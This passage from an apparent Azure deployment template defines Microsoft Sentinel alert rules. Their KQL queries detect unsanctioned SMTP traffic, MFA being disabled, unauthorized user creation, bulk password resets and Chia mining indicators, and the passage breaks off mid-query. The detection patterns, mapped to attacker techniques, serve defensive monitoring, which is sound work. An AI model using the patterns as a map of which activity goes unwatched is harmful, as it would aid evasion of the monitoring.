          "query": "let ingested_lookback = 1d;\nlet generated_lookback = 2d;\nlet SMTP_Server_Ranges = print nets = A114_SMTP_SERVER_RANGES | mv-expand nets | extend  ForJoin = 'ForJoin';\nCommonSecurityLog\n| where TimeGenerated > ago(generated_lookback) and ingestion_time() > ago(ingested_lookback) and TimeGenerated < now()\n//Filter results if SANCTIONED_SMTP_SERVERS is not populated\n| where '1.2.3.4' !in (SANCTIONED_SMTP_SERVERS)\n| where DeviceVendor =~ 'Palo Alto Networks'\n| where DeviceProduct =~ 'PAN-OS'\n| where SourceIP matches regex PRIVATE_IP == true\n| extend Protocol = strcat(toupper(Protocol),'/',DestinationPort)\n| where Protocol in ('TCP/25','TCP/587')\n| where DestinationIP !in~ (SANCTIONED_SMTP_SERVERS)\n| where SourceIP !in~ (A114_EXCLUSION_SOURCEIP)\n| extend ForJoin = 'ForJoin'\n| join kind=inner SMTP_Server_Ranges on ForJoin\n| where ipv4_is_match(DestinationIP, tostring(nets)) == true\n| project TimeGenerated, DestinationIP, SourceIP, Protocol, DestinationPort, DeviceAction\n| summarize NumberOfDestinationIPs=dcount(DestinationIP), Events = make_set(pack_all()), Connections=count(), DestinationIPs = make_set(DestinationIP), Protocols = make_set(Protocol), DevicesAction = make_set(DeviceAction) by IPCustomEntity = SourceIP, bin(TimeGenerated, 1d)",
          "queryFrequency": "P1D",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-9053')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-9053')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-9053: [Health] Silent - Paired systems have gone offline",
          "description": "This rule alerts when paired systems have both gone offline. This can be used in situations such as HA paired firewalls. The constant below will also accept sets larger than two.\nThresholds can be set per device grouping in A9053_CONFIGURATION MITRE:  Category: CommonSecurityLog/Syslog tag: Health",
          "severity": "Low",
          "enabled": false,
          "query": "let start_time=2h;\nlet latency=1h;  \nlet end_time=now();\nunion isfuzzy=true \n(Syslog\n  |where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n//|extend tablename= 'Syslog'\n)\n,\n(CommonSecurityLog\n|where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n//|extend tablename= 'CommonSecurityLog'\n)\n| where A9053_CONFIGURATION.ENABLED == 'true'\n| extend Computer = tolower(Computer)\n|summarize Computer = make_set_if(Computer, isnotempty(Computer))  \n| mv-apply DeviceSet = A9053_CONFIGURATION.MONITORED_SYSTEMS to typeof(dynamic) on(\n    extend intersect_test= set_intersect(Computer,DeviceSet)\n)\n|extend ha_pair_match = array_length(intersect_test) \n|where ha_pair_match == '0' and array_length(Computer) != '0'\n|extend ExtendedDescription = strcat('Device set or HA pair ', DeviceSet, ' has no devices reporting, please investigate and escalate if needed')\n| extend bv_rule_version = '1.2.4542'\n| extend bv_rule_timestamp = '1701446347.0184495'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.2.4542 bv_rule_timestamp: 1701446347.0184495'\n| extend bv_src_dvc = tostring(DeviceSet)\n|extend bv_start_time = now()\n  , bv_mss_category = 'LogSource Disruption'\n  , bv_alarm_type = 'Silent Device'\n  , bv_alarm_sub_type = 'EFD v1.0'\n  , bv_alarm_name = 'BV-9053'\n  , bv_alarm_severity = 'low'\n  , sourcetype = 'CommonSecurityLog or Syslog'\n  , bv_alarm_threshold = 'less than 1 system in pair present'\n  , bv_alarm_value = strcat(ha_pair_match, ' systems in pair present')\n  , bv_severity = 'low'\n  , bv_reporting_dvc = bv_src_dvc\n|project-keep ExtendedDescription, DeviceSet, bv_*, sourcetype",
          "queryFrequency": "PT2H",
          "queryPeriod": "PT3H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [],
          "techniques": [],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-9053: [Health] Silent - Paired systems have gone offline - {{DeviceSet}}",
            "alertDescriptionFormat": "This rule alerts when paired systems have both gone offline. This can be used in situations such as HA paired firewalls. The constant below will also accept sets larger than two.\n\nThresholds can be set per device grouping in A9053_CONFIGURATION\n\n{{ExtendedDescription}}\n\nCategory: CommonSecurityLog\nCategory: Syslog\ntag: Health"
          },
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-111111113')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-111111113')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-111111113: [Preview] Function Push",
          "description": "Used to push updates to the new BVIM parser validators MITRE: T1562 Category: BVIM tag: Preview",
          "severity": "Informational",
          "enabled": false,
          "query": "bvim_validator(ago(10m),now(),'*', true)               \n|limit 1 ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-612')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-612')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-612: [RBA] Microsoft DNS - High Reverse DNS",
          "description": "Alert is generated if the IP performing such reverse DNS lookups was not seen doing so in the preceding 7-day period which may indicate scanning activity MITRE: T1046 Category: Microsoft DNS tag: RBA",
          "severity": "Informational",
          "enabled": false,
          "query": "let REVERSE_DNS_THRESHOLD=10;\nlet starttime = 7d;\nlet endtime = 1d;\n  DnsEvents\n  | where TimeGenerated > ago(endtime)\n  | where Name contains 'in-addr.arpa'\n  | where QueryType!='DHCID'\n  | where Name !in~ (A612_EXCLUDED_NAME)\n  | where ClientIP !in~ (A612_EXCLUDED_IP)\n  | summarize TimeGenerated = min(TimeGenerated), make_set(Name), NameDistictCount=dcount(Name), Names=make_set(Name), QueryTypes=make_set(QueryType) by ClientIP, Computer\n  | where NameDistictCount > REVERSE_DNS_THRESHOLD\n  | project TimeGenerated, ClientIP , NameDistictCount, Names, QueryTypes, Computer\n  | join kind=leftanti (DnsEvents\n      | where TimeGenerated between(ago(starttime)..ago(endtime))\n      | where Name contains 'in-addr.arpa'\n      | summarize dcount(Name) by ClientIP, Computer\n      | where dcount_Name > REVERSE_DNS_THRESHOLD\n      | project ClientIP , dcount_Name, Computer\n  ) on ClientIP, Computer\n  | extend IPCustomEntity = ClientIP, Names, QueryTypes, Computer\n  | parse Computer with HostName '.' HostDNS\n  | project TimeGenerated, IPCustomEntity, Names, QueryTypes, Computer, HostName, HostDNS",
          "queryFrequency": "P1D",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Discovery"
          ],
          "techniques": [
            "T1046"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "HostDNS"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-022')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-022')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-022: [Hygiene] Azure AD - MFA Disabled",
          "description": "Multi-Factor Authentication (MFA) helps prevent credential compromise. This alert identifies when an attempt has been made to disable MFA for a user. MITRE: T1098 Category: Azure AD tag: Hygiene",
          "severity": "Medium",
          "enabled": false,
          "query": "let ingested_lookback = 1h; // earliest [ingest time] boundary\n            let generated_lookback = 2h; // earliest [log time] boundary\n            let alert_bin = 1h;\n              AuditLogs\n              | where TimeGenerated between ( ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n              | where OperationName =~ 'Disable Strong Authentication'\n              | extend IPAddress = tostring(parse_json(tostring(InitiatedBy.user)).ipAddress)\n              | extend InitiatedByUser = iff(isnotempty(tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName)),\n              tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName))\n              | extend Targetprop = todynamic(TargetResources)\n              | extend TargetUser = tostring(Targetprop[0].userPrincipalName)\n              | summarize StartTimeUtc = min(TimeGenerated), TargetUsers=make_set(TargetUser, MaxSize=3), TargetUserCount = dcount(TargetUser) by AccountCustomEntity=InitiatedByUser, Operation = OperationName , IPCustomEntity = IPAddress, Category, bin_at(TimeGenerated, alert_bin, now())\n              | extend AlertData = base64_encode_tostring(tostring(pack_all()))\n              | parse AccountCustomEntity with InitiatedByUserName '@' InitiatedByUserDnsDomain\n              | parse TargetUsers[0] with TargetName1 '@' TargetDomain1\n              | parse TargetUsers[1] with TargetName2 '@' TargetDomain2\n              | parse TargetUsers[3] with TargetName3 '@' TargetDomain3\n              | project StartTimeUtc, TargetUsers, TargetName1, TargetDomain1, TargetName2, TargetDomain2, TargetName3, TargetDomain3, TargetUserCount, Operation, IPCustomEntity, Category, AlertData, AccountCustomEntity, TimeGenerated, InitiatedByUserName, InitiatedByUserDnsDomain",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Persistence"
          ],
          "techniques": [
            "T1098"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "AlertData": "AlertData"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetName1"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "TargetDomain1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetName2"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "TargetDomain2"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "TargetName3"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "TargetDomain3"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "InitiatedByUserName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "InitiatedByUserDnsDomain"
                }
              ]
            },
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "IPCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-111111114')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-111111114')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-111111114: [Preview] Function Push",
          "description": "Used to push updates to the new BVIM parser full model validators MITRE: T1562 Category: BVIM tag: Preview",
          "severity": "Informational",
          "enabled": false,
          "query": "bvim_network_validator(ago(10m),now(),'*', true)            \n|limit 1 ",
          "queryFrequency": "PT1H",
          "queryPeriod": "P2D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1562"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": null,
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-1904')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-1904')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-1904: [SOC] AzureAD - Users Created by Unauthorized Administrators",
          "description": "This alert identifies users created by unauthorized Azure AD administrators. MITRE: T1078 Category: Azure AD tag: SOC",
          "severity": "Low",
          "enabled": false,
          "query": "let latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\nlet alert_bin = 1h; \nAuditLogs\n| where TimeGenerated between (ago(latency + start_time ) .. end_time) and  ingestion_time() >= ago(start_time)\n|where OperationName has_any ('Add user')\n| where Result =~ 'success'\n| extend Account = iff(isnotempty(InitiatedBy.user), tostring(parse_json(tostring(InitiatedBy.user)).userPrincipalName), tostring(parse_json(tostring(InitiatedBy.app)).displayName))\n| extend TargetAccount = tostring(TargetResources[0].userPrincipalName)      \n//Requires Constant to be set\n| where A1904_AUTHORIZED_ADMIN != 'Default value'\n|where tolower(TargetAccount) matches regex tolower(A1904_EXCLUDE_TARGETACCOUNT) == false\n|project TimeGenerated, Account, TargetAccount, OperationName\n|summarize EventCount=count(),TimeGenerated=min(TimeGenerated), TargetAccounts=make_set(TargetAccount, MaxSize=5), TargetAccountCount=dcount(TargetAccount) by Account, bin_at(TimeGenerated,alert_bin, now())\n| parse Account with AccountNTDomain @'\\' AccountName\n| extend Authorized = iff(tolower(Account) matches regex tolower(A1904_AUTHORIZED_ADMIN), true, false)\n| extend Class = case(Authorized == false, 'SOC', 'RBA')\n| extend Tags = case(Class =~ 'RBA', 'tag: RBA', 'tag: Custom')\n| extend AlertName = strcat('BV-1904: [', Class, '] Azure AD - Users Created by Unauthorized Administrators')      \n| extend ExtendedDescription = strcat(\n  'Admin: ', Account\n  , '\\nTarget Accounts Created: \\n* ', strcat_array(array_slice(TargetAccounts, 0, 5), '\\n* ')\n )\n| extend AttackerEntity = array_concat(pack_array(Account)), VictimEntity = TargetAccounts, bv_mapping_tag = Account\n| project TimeGenerated, Account, TargetAccounts, AccountNTDomain, AccountName, ExtendedDescription, AttackerEntity, VictimEntity, RBAScore = 3, Class, Tags, AlertName, bv_mapping_tag",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation",
            "DefenseEvasion",
            "Persistence",
            "InitialAccess"
          ],
          "techniques": [
            "T1078"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Account"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "{{AlertName}}",
            "alertDescriptionFormat": "This alert identifies users created by unauthorized Azure AD administrators.\n\n{{ExtendedDescription}}\n\nCategory: Azure AD\n{{Tags}}\nMITRE: T1078"
          },
          "customDetails": {
            "AttackerEntity": "AttackerEntity",
            "VictimEntity": "VictimEntity",
            "RBAScore": "RBAScore",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "AccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "AccountNTDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/33d6bd74-7ec6-45a7-b2f4-b032c34251dd')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/33d6bd74-7ec6-45a7-b2f4-b032c34251dd')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "MicrosoftSecurityIncidentCreation",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Create incidents based on Microsoft Defender for Identity alerts",
          "description": "Create incidents based on all alerts generated in Microsoft Defender for Identity",
          "enabled": true,
          "productFilter": "Azure Advanced Threat Protection",
          "severitiesFilter": null,
          "displayNamesFilter": null,
          "displayNamesExcludeFilter": null,
          "alertRuleTemplateName": "40ba9493-4183-4eee-974f-87fe39c8f267"
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/7ebed201-e972-453a-a48e-2a62aef769b7')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/7ebed201-e972-453a-a48e-2a62aef769b7')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Multiple Password Reset by user",
          "description": "This query will determine multiple password resets by user across multiple data sources. \nAccount manipulation including password reset may aid adversaries in maintaining access to credentials \nand certain permission levels within an environment.",
          "severity": "Low",
          "enabled": true,
          "query": "let timeframe = 1d;\nlet PerUserThreshold = 12;\nlet TotalThreshold = 100;\nlet action = dynamic([\"change\", \"changed\", \"reset\"]);\nlet pWord = dynamic([\"password\", \"credentials\"]);\nlet PasswordResetMultiDataSource =\n(union isfuzzy=true\n(//Password reset events\n//4723: An attempt was made to change an account's password\n//4724: An attempt was made to reset an accounts password\nSecurityEvent\n| where TimeGenerated >= ago(timeframe)\n| where EventID in (\"4723\",\"4724\")\n| project TimeGenerated, Computer, AccountType, Account, Type),\n(//Azure Active Directory Password reset events\nAuditLogs\n| where TimeGenerated >= ago(timeframe)\n| where OperationName has_any (pWord) and OperationName has_any (action)\n| extend AccountType = tostring(TargetResources[0].type), Account = tostring(TargetResources[0].userPrincipalName), \nTargetResourceName = tolower(tostring(TargetResources[0].displayName))\n| project TimeGenerated, AccountType, Account, Computer = TargetResourceName, Type),\n(//OfficeActive ActiveDirectory Password reset events\nOfficeActivity\n| where TimeGenerated >= ago(timeframe)\n| where OfficeWorkload == \"AzureActiveDirectory\" \n| where (ExtendedProperties has_any (pWord) or ModifiedProperties has_any (pWord)) and (ExtendedProperties has_any (action) or ModifiedProperties has_any (action))\n| extend AccountType = UserType, Account = OfficeObjectId \n| project TimeGenerated, AccountType, Account, Type, Computer = \"\"),\n(// Unix syslog password reset events\nSyslog\n| where TimeGenerated >= ago(timeframe)\n| where Facility in (\"auth\",\"authpriv\")\n| where SyslogMessage has_any (pWord) and SyslogMessage has_any (action)\n| extend AccountType = iif(SyslogMessage contains \"root\", \"Root\", \"Non-Root\")\n| parse SyslogMessage with * \"password changed for\" Account\n| project TimeGenerated, AccountType, Account, Computer = HostName, Type),\n(SigninLogs\n| where TimeGenerated >= ago(timeframe)\n| where OperationName =~ \"Sign-in activity\" and ResultType has_any (\"50125\", \"50133\")\n| project TimeGenerated, AccountType = AppDisplayName, Computer = IPAddress, Account = UserPrincipalName, Type\n)\n);\nlet pwrmd = PasswordResetMultiDataSource\n| project TimeGenerated, Computer, AccountType, Account, Type;\n(union isfuzzy=true  \n(pwrmd\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), Computer = makeset(Computer), AccountType = makeset(AccountType), Total=count() by Account, Type\n| where Total > PerUserThreshold\n| extend ResetPivot = \"PerUserReset\"),  \n(pwrmd\n| summarize StartTimeUtc = min(TimeGenerated), EndTimeUtc = max(TimeGenerated), Computer = makeset(Computer), Account = tostring(makeset(Account)), AccountType = makeset(AccountType), Total=count() by Type\n| where Total > TotalThreshold\n| extend ResetPivot = \"TotalUserReset\")\n)\n| extend timestamp = StartTimeUtc, AccountCustomEntity = Account, HostCustomEntity = tostring(Computer)",
          "queryFrequency": "P1D",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT5H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CredentialAccess"
          ],
          "techniques": [
            "T1078",
            "T1110"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": "0b9ae89d-8cad-461c-808f-0494f70ad5c4",
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5H",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": null,
          "customDetails": null,
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "AccountCustomEntity"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "HostCustomEntity"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/59f8fd51-b2f7-4e87-97d3-d18db42c8760')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/59f8fd51-b2f7-4e87-97d3-d18db42c8760')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "Chia_Crypto_Mining - Domain, Process, Hash and IP IOCs - June 2021",
          "description": "Identifies a match across various data feeds for domains, process, hashes and IP IOC related to Chia cryptocurrency farming/plotting activity.",
          "severity": "Low",
          "enabled": true,
          "query": "let iocs = externaldata(DateAdded:string,IoC:string,Type:string,TLP:string) [@\"https://raw.githubusercontent.com/Azure/Azure-Sentinel/master/Sample%20Data/Feeds/ChiaCryptoIOC.csv\"] with (format=\"csv\", ignoreFirstRecord=True);\nlet process = (iocs | where Type =~ \"process\" | project IoC);\nlet sha256Hashes = (iocs | where Type =~ \"sha256\" | project IoC);\nlet IPList = (iocs | where Type =~ \"ip\"| project IoC);\nlet domains = (iocs | where Type =~ \"domainname\"| project IoC);\nlet IPRegex = '[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}\\\\.[0-9]{1,3}';\n//This query uses sysmon data, sections that have - | where Source == \"Microsoft-Windows-Sysmon\" - may need to be updated with latest\n(union isfuzzy=true\n(CommonSecurityLog\n| where SourceIP in (IPList) or DestinationIP in (IPList) or DestinationHostName has_any (domains) or RequestURL has_any (domains) or Message has_any (IPList)\n| parse Message with * '(' DNSName ')' * \n| project TimeGenerated, SourceIP, DestinationIP, Message, SourceUserID, RequestURL, DNSName, Type\n| extend MessageIP = extract(IPRegex, 0, Message), RequestIP = extract(IPRegex, 0, RequestURL)\n| extend IPMatch = case(SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", MessageIP in (IPList), \"Message\", RequestURL has_any (domains), \"RequestUrl\", \"NoMatch\"),  AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, IPEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, IPMatch == \"Message\", MessageIP, \"NoMatch\"), Account = SourceUserID\n),\n(DnsEvents\n| where IPAddresses in (IPList) or Name in~ (domains)  \n| project TimeGenerated, Computer, IPAddresses, Name, ClientIP, Type\n| extend DestinationIPAddress = IPAddresses, DNSName = Name, Computer , AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, IPEntity = DestinationIPAddress\n),\n(VMConnection\n| where SourceIp in (IPList) or DestinationIp in (IPList) or RemoteDnsCanonicalNames has_any (domains)\n| parse RemoteDnsCanonicalNames with * '[\"' DNSName '\"]' *\n| project TimeGenerated, Computer, Direction, ProcessName, SourceIp, DestinationIp, DestinationPort, RemoteDnsQuestions, DNSName,BytesSent, BytesReceived, RemoteCountry, Type\n| extend IPMatch = case( SourceIp in (IPList), \"SourceIP\", DestinationIp in (IPList), \"DestinationIP\", \"None\") , AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, IPEntity = case(IPMatch == \"SourceIP\", SourceIp, IPMatch == \"DestinationIP\", DestinationIp, \"NoMatch\"), File = ProcessName\n),\n(Event\n| where Source == \"Microsoft-Windows-Sysmon\"\n| where EventID == 3\n| extend EvData = parse_xml(EventData)\n| extend EventDetail = EvData.DataItem.EventData.Data\n| extend SourceIP = tostring(EventDetail.[9].[\"#text\"]), DestinationIP = tostring(EventDetail.[14].[\"#text\"]), Image = tostring(EventDetail.[4].[\"#text\"])\n| where SourceIP in (IPList) or DestinationIP in (IPList) or Image has_any (process)\n| project TimeGenerated, SourceIP, DestinationIP, Image, Account = UserName, Computer, Type\n| extend IPMatch = case( SourceIP in (IPList), \"SourceIP\", DestinationIP in (IPList), \"DestinationIP\", \"None\") , AlertDetail = 'Chia crypto IOC detected'\n| extend timestamp = TimeGenerated, File = tostring(split(Image, '\\\\', -1)[-1]), IPEntity = case(IPMatch == \"SourceIP\", SourceIP, IPMatch == \"DestinationIP\", DestinationIP, \"None\")\n| extend FilePath = replace_string(Image, File, '')\n),  \n(OfficeActivity\n| where ClientIP in (IPList) \n| project 